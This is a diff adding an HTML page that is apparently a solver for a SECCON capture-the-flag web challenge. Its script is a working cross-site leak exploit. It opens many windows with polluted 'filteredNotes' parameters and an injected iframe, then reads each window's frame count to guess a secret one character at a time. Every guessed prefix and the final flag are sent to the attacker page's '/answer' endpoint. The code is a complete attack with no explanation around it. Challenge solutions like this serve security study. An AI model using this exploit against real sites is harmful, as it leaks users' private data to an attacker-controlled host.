@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+</head>
+
+<body>
+  <script>
+
+    const baseUrl = "http://web:3000";
+    // const baseUrl = "http://localhost:3000";
+
+    const hookUrl = location.origin + "/answer"
+
+    const sleep = msec => new Promise(resolve => setTimeout(resolve, msec));
+    const chars = "}_0123456789abcdefghijklmnopqrstuvwxyz".split("");
+
+    const search = async (prefix) => {
+      const w = open(`/post.html?prefix=${encodeURIComponent(prefix)}&url=${encodeURIComponent(baseUrl)}`);
+      await sleep(1000);
+      w.close();
+
+      const ws = [];
+
+      for(const c of chars) {
+        const injected = ' filteredNotes';
+
+        const params = new URLSearchParams();
+        params.append("search", prefix + c);
+        params.append(injected, "x");
+        params.append(injected + "[length]", "100000");
+        params.append("msg", "<iframe></iframe>");
+
+        ws.push(open(`${baseUrl}/?${params}`));
+      }
+
+      await sleep(2000);
+
+      let nextChar = null;
+      for(let i=0; i<ws.length; i++) {
+        if (ws[i].length > 0) {
+          nextChar = chars[i];
+        }
+        ws[i].close();
+      }
+      return nextChar;
+    }
+
+    const main = async () => {
+      let prefix = "SECCON{"
+
+      while(true) {
+        await fetch(`${hookUrl}?flag=${encodeURIComponent(prefix)}`); // debug
+
+        const c = await search(prefix);
+        if (c == null) break;
+        prefix += c;
+      }
+
+      location = `${hookUrl}?flag=${encodeURIComponent(prefix)}`;
+    };
+
+    main();
+  </script>
+</body>
